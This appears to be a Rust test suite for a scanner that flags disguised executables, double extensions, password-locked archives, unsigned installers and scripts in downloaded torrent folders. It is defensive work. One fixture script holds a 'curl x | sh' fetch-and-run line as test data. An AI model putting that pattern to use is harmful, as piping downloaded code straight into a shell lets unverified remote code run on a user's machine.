use std::io::Write;
use std::path::{Path, PathBuf};

use crate::kinds::{double_extension, of_bytes, of_name};
use crate::{Clam, Concern, Kind, Options, scan, seven_zip_listing};

const MP4: &[u8] = b"\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom";
const EXE: &[u8] = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff";
const MACHO: &[u8] = &[0xCF, 0xFA, 0xED, 0xFE, 7, 0, 0, 1];

fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    let p = dir.join(name);
    if let Some(parent) = p.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(&p, bytes).unwrap();
    p
}

/// A ZIP of `entries` (name, bytes), stored; `locked`: every entry marked encrypted, as a ZIP
/// with a password is (bit 0 of its flags, in its local and central headers).
fn zip_of(entries: &[(&str, &[u8])], locked: bool) -> Vec<u8> {
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        let mut z = zip::ZipWriter::new(&mut buf);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        for (name, bytes) in entries {
            z.start_file(*name, opts).unwrap();
            z.write_all(bytes).unwrap();
        }
        z.finish().unwrap();
    }
    let mut bytes = buf.into_inner();
    if locked {
        for i in 0..bytes.len().saturating_sub(4) {
            match &bytes[i..i + 4] {
                b"PK\x03\x04" => bytes[i + 6] |= 1,
                b"PK\x01\x02" => bytes[i + 8] |= 1,
                _ => {}
            }
        }
    }
    bytes
}

/// The first bytes decide, not the name: programs of each system, archives, media.
#[test]
fn files_are_known_by_their_bytes() {
    assert_eq!(of_bytes(EXE), Some(Kind::WindowsProgram));
    assert_eq!(of_bytes(MACHO), Some(Kind::MacProgram));
    assert_eq!(of_bytes(b"\x7fELF\x02\x01"), Some(Kind::LinuxProgram));
    assert_eq!(of_bytes(b"#!/bin/sh\necho"), Some(Kind::Script));
    assert_eq!(of_bytes(b"xar!\x00\x1c"), Some(Kind::MacInstaller));
    assert_eq!(of_bytes(b"PK\x03\x04\x14\x00"), Some(Kind::Zip));
    assert_eq!(of_bytes(b"Rar!\x1a\x07\x01\x00"), Some(Kind::Rar));
    assert_eq!(of_bytes(MP4), Some(Kind::Video));
    assert_eq!(of_bytes(b"ID3\x04\x00"), Some(Kind::Audio));
    assert_eq!(of_bytes(b"%PDF-1.7"), Some(Kind::Pdf));
    assert_eq!(of_bytes(b"\x89PNG\r\n"), Some(Kind::Image));
    assert_eq!(of_bytes(b"1\n00:00:01,000 --> 00:00:02,000\nHi"), None);
}

/// Names: what they claim, and the ones built to fool (`film.mp4.exe`).
#[test]
fn names_say_what_they_claim() {
    assert_eq!(of_name("Movie.MKV"), Kind::Video);
    assert_eq!(of_name("setup.exe"), Kind::WindowsProgram);
    assert_eq!(of_name("Install.command"), Kind::Script);
    assert_eq!(of_name("Codec.pkg"), Kind::MacInstaller);
    assert_eq!(of_name("subs.en.srt"), Kind::Text);
    assert_eq!(of_name("README"), Kind::Other);
    assert_eq!(of_name(".exe"), Kind::Other, "a dot file has no extension");
    assert!(double_extension("Movie.2026.1080p.mp4.exe"));
    assert!(double_extension("photo.jpg .scr"));
    assert!(!double_extension("setup.exe"));
    assert!(!double_extension("archive.tar.gz"));
    assert!(!double_extension("Season.1.Episode.2.mkv"));
}

/// A film torrent: the video, its subtitles and poster pass; a program dressed as a video, a
/// double extension, an installer and a script don't, each for what it is.
#[test]
fn a_torrent_with_a_hidden_program_needs_attention() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    write(
        root,
        "Film/Film.2026.mkv",
        b"\x1a\x45\xdf\xa3\x01\x00matroska",
    );
    write(
        root,
        "Film/Film.2026.en.srt",
        b"1\n00:00:01,000 --> 00:00:02,000\nHello\n",
    );
    write(root, "Film/poster.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF");
    write(root, "Film/Sample.mp4", EXE);
    write(root, "Film/Watch.mp4.exe", EXE);
    write(root, "Film/Codec Pack.pkg", b"xar!\x00\x1c\x00\x01");
    write(root, "Film/play.command", b"#!/bin/bash\ncurl x | sh\n");
    let report = scan(root, &[PathBuf::from("Film")], &Options::default());
    assert!(!report.clean());
    assert_eq!(report.clamav, Clam::NotInstalled);
    let of = |name: &str| {
        report
            .files
            .iter()
            .find(|f| f.path.ends_with(name))
            .unwrap_or_else(|| panic!("{name} wasn't scanned"))
    };
    for clean in ["Film.2026.mkv", "Film.2026.en.srt", "poster.jpg"] {
        assert!(
            of(clean).concerns.is_empty(),
            "{clean}: {:?}",
            of(clean).concerns
        );
    }
    assert_eq!(of("Film.2026.mkv").kind, Kind::Video);
    assert!(of("Sample.mp4").concerns.contains(&Concern::Disguised {
        claims: Kind::Video,
        is: Kind::WindowsProgram
    }));
    assert!(
        of("Watch.mp4.exe")
            .concerns
            .contains(&Concern::DoubleExtension)
    );
    assert!(
        of("Watch.mp4.exe")
            .concerns
            .contains(&Concern::Runs(Kind::WindowsProgram))
    );
    // On macOS the installer is also checked for a signature (`pkgutil`): this made-up one
    // has none.
    let pkg = &of("Codec Pack.pkg").concerns;
    assert_eq!(pkg[0], Concern::Runs(Kind::MacInstaller));
    if cfg!(target_os = "macos") {
        assert!(
            matches!(pkg.as_slice(), [_, Concern::Unsigned(_)]),
            "{pkg:?}"
        );
    } else {
        assert_eq!(pkg.len(), 1, "{pkg:?}");
    }
    assert_eq!(
        of("play.command").concerns,
        vec![Concern::Runs(Kind::Script)]
    );
    assert_eq!(report.clean_files().count(), 3);
    assert_eq!(report.flagged().count(), 4);
    // Paths are the torrent's own, under the folder scanned.
    assert_eq!(of("poster.jpg").path, PathBuf::from("Film/poster.jpg"));
}

/// Nothing but media and text: clean.
#[test]
fn a_plain_film_is_clean() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), "a.mp4", MP4);
    write(
        dir.path(),
        "a.srt",
        b"1\n00:00:01,000 --> 00:00:02,000\nHi\n",
    );
    let files = [PathBuf::from("a.mp4"), PathBuf::from("a.srt")];
    let report = scan(dir.path(), &files, &Options::default());
    assert!(report.clean(), "{report:?}");
    assert_eq!(report.files.len(), 2);
    assert_eq!(report.files[0].size, MP4.len() as u64);
}

/// A ZIP is looked inside: a program in it, or a password on it, needs attention; one of
/// pictures doesn't. A ZIP named as a video is a disguise too.
#[test]
fn zips_are_looked_inside() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    write(
        root,
        "photos.zip",
        &zip_of(&[("a.jpg", b"\xff\xd8\xff"), ("b.png", b"\x89PNG")], false),
    );
    write(
        root,
        "bonus.zip",
        &zip_of(&[("readme.txt", b"hi"), ("tools/patch.exe", EXE)], false),
    );
    write(root, "locked.zip", &zip_of(&[("film.mkv", b"x")], true));
    write(root, "clip.avi", &zip_of(&[("x.txt", b"x")], false));
    let names: Vec<PathBuf> = ["photos.zip", "bonus.zip", "locked.zip", "clip.avi"]
        .iter()
        .map(PathBuf::from)
        .collect();
    let report = scan(root, &names, &Options::default());
    let concerns = |i: usize| &report.files[i].concerns;
    assert!(concerns(0).is_empty(), "{:?}", concerns(0));
    assert_eq!(
        concerns(1),
        &vec![Concern::RunsInside("tools/patch.exe".into())]
    );
    assert_eq!(concerns(2), &vec![Concern::LockedArchive]);
    assert!(concerns(3).contains(&Concern::Disguised {
        claims: Kind::Video,
        is: Kind::Zip
    }));
}

/// A Mac app is one file to the person (its bundle), and needs attention as an app.
#[test]
fn a_mac_app_is_checked_whole() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), "Player.app/Contents/MacOS/Player", MACHO);
    write(dir.path(), "Player.app/Contents/Info.plist", b"<plist/>");
    let report = scan(
        dir.path(),
        &[PathBuf::from("Player.app")],
        &Options::default(),
    );
    assert_eq!(report.files.len(), 1);
    assert_eq!(report.files[0].kind, Kind::MacApp);
    assert!(
        report.files[0]
            .concerns
            .contains(&Concern::Runs(Kind::MacApp))
    );
}

/// 7-Zip's listing of a RAR or 7z: a password, or a program inside.
#[test]
fn seven_zips_listing_is_read() {
    let listing = "Path = /q/film.rar\nType = Rar5\n\n----------\nPath = Film/film.mkv\nEncrypted = -\n\nPath = Film/Crack/keygen.exe\nEncrypted = -\n";
    assert_eq!(
        seven_zip_listing(listing, ""),
        vec![Concern::RunsInside("Film/Crack/keygen.exe".into())]
    );
    let locked = "Path = /q/x.7z\nType = 7z\n\n----------\nPath = a.mkv\nEncrypted = +\n";
    assert_eq!(seven_zip_listing(locked, ""), vec![Concern::LockedArchive]);
    assert_eq!(
        seven_zip_listing(
            "",
            "ERROR: /q/x.7z : Can not open encrypted archive. Wrong password?"
        ),
        vec![Concern::LockedArchive]
    );
    assert!(seven_zip_listing("Path = /q/x.rar\n\nPath = a.mkv\nEncrypted = -\n", "").is_empty());
}

/// Every concern reads as a line (the log's).
#[test]
fn concerns_describe_themselves() {
    let d = Concern::Disguised {
        claims: Kind::Video,
        is: Kind::WindowsProgram,
    };
    assert_eq!(d.describe(), "named as a video but is a Windows program");
    assert_eq!(
        Concern::Malware("Eicar".into()).describe(),
        "ClamAV found Eicar"
    );
}
